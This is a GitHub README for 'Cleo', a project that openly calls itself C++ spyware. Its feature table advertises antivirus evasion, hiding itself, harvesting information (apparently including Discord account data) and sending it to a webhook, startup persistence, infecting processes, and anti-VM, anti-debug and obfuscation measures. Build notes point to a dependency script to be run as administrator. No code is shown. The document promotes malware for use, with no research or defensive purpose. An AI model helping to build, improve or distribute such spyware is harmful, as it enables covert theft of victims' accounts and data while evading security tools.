# Cleo
<img src="https://img.shields.io/github/stars/Passive/Cleo?style=plastic"> <img src="https://img.shields.io/github/forks/Passive/Cleo?style=plastic">                                                      
C++ Spyware — Currently working on an update. Probably never going to get finished but anyways. 

Make sure to ⭐ this repository!

## Features

Feature  | Description
-------- | -----------
Silence | Software has anti-virus evasion and hides itself
Info Grab | Program will gather information and report back to webhook
Persistence | Runs at startup and will infect some processes
Anti VM | Evasion of virtual machines for analysis.
Anti Debug | Evasion of debugging methods.
Obfuscation | Automatic compile-time string obfuscation.

## Dependencies
All things here can be installed automatically by running the powershell script [here](https://github.com/dehoisted/Cleo/blob/main/install_dependencies.ps1).
+ [LibCurl](https://curl.se/libcurl/c/) - Used by CPR behind the scenes.
+ [CPR](https://github.com/whoshuu/cpr) - Simply a wrapper over LibCurl, used for all HTTP requests in Cleo.
+ [JSON Parser](https://github.com/nlohmann/json) - For parsing discord account information.
+ [String Obfuscator](https://github.com/adamyaxley/Obfuscate) - Used for hiding important strings. (already in Cleo source as "AY_Obfuscate.h")

## Building
In order to build Cleo you must first install the needed dependencies! **This is vital to ensure you don't make a false issue**
When running the powershell script **run it as administrator**.

## Credits                                                                                                      
+ [Passive](https://github.com/Passive) 
+ [Dehoisted](https://github.com/dehoisted)                                                                                                                                   
